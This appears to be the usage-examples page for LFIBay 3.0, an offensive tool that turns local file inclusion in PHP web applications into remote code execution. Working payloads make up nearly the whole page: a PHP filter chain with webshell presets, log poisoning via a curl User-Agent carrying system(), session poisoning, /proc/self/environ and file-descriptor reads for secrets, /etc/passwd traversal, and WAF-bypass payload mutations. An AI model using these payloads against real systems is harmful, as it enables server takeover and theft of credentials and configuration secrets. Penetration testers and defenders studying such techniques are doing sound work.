# LFIBay 3.0 - Quick Usage Examples

## 🚀 Basic Usage (Unchanged)

```bash
python lfibay.py
```

1. Enter login URL → Manual login → Press Enter
2. Enter upload form URL
3. Tool automatically tests 764+ payloads
4. View results in terminal and HTML report

---

## 🔥 New Features - Usage Examples

### 1. PHP Filter Chain RCE

**Use Case**: Achieve RCE without file upload

```python
from core.filter_chain import get_preset_chains, get_all_filter_chains

# Get preset chains
chains = get_preset_chains()
print(f"Available presets: {list(chains.keys())}")
# Output: ['whoami', 'id', 'pwd', 'ls', 'phpinfo', 'webshell', 'read_passwd', 'readfile_passwd']

# Use a preset chain
webshell_chain = chains['webshell']['chain']
print(webshell_chain)
# Use this chain in LFI: ?file=<chain>&cmd=id

# Get all filter chain payloads
all_chains = get_all_filter_chains()
print(f"Total filter chains: {len(all_chains)}")
# Output: Total filter chains: 53
```

**Manual Test**:
```
Target: http://example.com/view.php?file=

Payload: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php

Then add: &cmd=whoami
```

---

### 2. Log Poisoning Attack

**Use Case**: Convert LFI to RCE via log injection

```python
from core.log_poisoning import poison_apache_log, detect_log_paths, create_attack_plan

# Step 1: Poison the log
result = poison_apache_log(
    target_url='http://example.com',
    payload="<?php system($_GET['cmd']); ?>",
    method='user_agent'  # or 'referer' or 'cookie'
)
print(f"Log poisoned: {result['success']}")

# Step 2: Auto-detect accessible logs
accessible = detect_log_paths(
    'http://example.com/view.php?file=INJECT',
    cookies={'PHPSESSID': 'abc123'}
)
print(f"Accessible logs: {accessible}")
# Output: ['/var/log/apache2/access.log', '/var/log/nginx/access.log']

# Step 3: Create attack plan
plan = create_attack_plan(
    target_url='http://example.com',
    target_ip='192.168.1.100',
    accessible_logs=accessible
)
print(f"Recommended: {plan['recommended_order'][0]['method']}")
```

**Manual Attack**:
```bash
# 1. Poison with curl
curl "http://example.com" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Include log via LFI
http://example.com/view.php?file=/var/log/apache2/access.log

# 3. Execute command
http://example.com/view.php?file=/var/log/apache2/access.log&cmd=id
```

---

### 3. Session Poisoning

**Use Case**: Hijack PHP sessions for RCE

```python
from core.session_poisoning import extract_phpsessid, poison_session, generate_session_paths

# Extract session ID
cookies = {'PHPSESSID': 'qmmlo8ptb8akof92oerk191o9b'}
session_id = extract_phpsessid(cookies)
print(f"Session ID: {session_id}")

# Poison session
result = poison_session(
    url='http://example.com/profile.php',
    cookies=cookies,
    payload="<?php system('id'); ?>",
    param_name='username'  # controllable parameter
)
print(f"Session poisoned via: {result['param_name']}")

# Get possible session paths
paths = generate_session_paths(session_id)
print(f"Try including: {paths[0]}")
# Output: /var/lib/php/sessions/sess_qmmlo8ptb8akof92oerk191o9b
```

**Manual Attack**:
```
# 1. Set session data
http://example.com/profile.php?username=<?php system('whoami'); ?>

# 2. Include session file
http://example.com/view.php?file=/var/lib/php/sessions/sess_<your_session_id>
```

---

### 4. /proc/ Exploitation

**Use Case**: Extract sensitive information from Linux /proc/

```python
from core.proc_exploitation import brute_force_fd, extract_environ, test_proc_paths, create_proc_report

# Brute force file descriptors
fds = brute_force_fd(
    'http://example.com/view.php?file=INJECT',
    start=0,
    end=20,
    cookies={'session': 'abc'}
)
print(f"Found {len(fds)} accessible file descriptors")
for fd in fds:
    if fd['interesting']:
        print(f"FD {fd['fd']}: {fd['preview'][:50]}...")

# Extract environment variables
env_result = extract_environ('http://example.com/view.php?file=INJECT')
if env_result['success']:
    print(f"Environment variables: {len(env_result['env_vars'])}")
    if env_result['sensitive_found']:
        print("⚠️  Sensitive data found!")

# Test common /proc paths
proc_results = test_proc_paths('http://example.com/view.php?file=INJECT')
report = create_proc_report(proc_results['accessible_paths'])
print(report)
```

**Manual Test**:
```
# Try file descriptors
http://example.com/view.php?file=/proc/self/fd/0
http://example.com/view.php?file=/proc/self/fd/10

# Extract environment
http://example.com/view.php?file=/proc/self/environ

# Read process info
http://example.com/view.php?file=/proc/self/cmdline
```

---

### 5. Payload Mutations

**Use Case**: Auto-generate WAF bypass variations

```python
from utils.payload_mutator import mutate_all, smart_mutate, mutate_single

# Basic mutation
payloads = ['../../../etc/passwd', '../../../../etc/passwd']
mutated = mutate_all(payloads, max_mutations_per_payload=15)
print(f"Generated {len(mutated)} variations from {len(payloads)} base payloads")
# Output: Generated 30 variations from 2 base payloads

# Smart mutation (target-aware)
target_info = {
    'os': 'windows',
    'waf': True,
    'waf_type': 'cloudflare'
}
smart = smart_mutate(payloads, target_detected=target_info)
print(f"Smart mutations: {len(smart)}")

# Single payload mutation
single = mutate_single('../../../etc/passwd')
print(f"Variations for single payload:")
for i, var in enumerate(single[:5], 1):
    print(f"{i}. {var}")
```

**Example Mutations**:
```
Original: ../../../etc/passwd

Mutations:
1. ..%2f..%2f..%2fetc%2fpasswd          (URL encoded)
2. ..%252f..%252f..%252fetc%252fpasswd  (Double encoded)
3. ....//....//....//etc/passwd         (Dot variation)
4. ../**/../**/../**/etc/passwd         (Comment injection)
5. ../ ../. ./ etc/ passwd              (Whitespace)
...15 total variations
```

Refer to README.md and CHANGELOG.md for complete documentation.
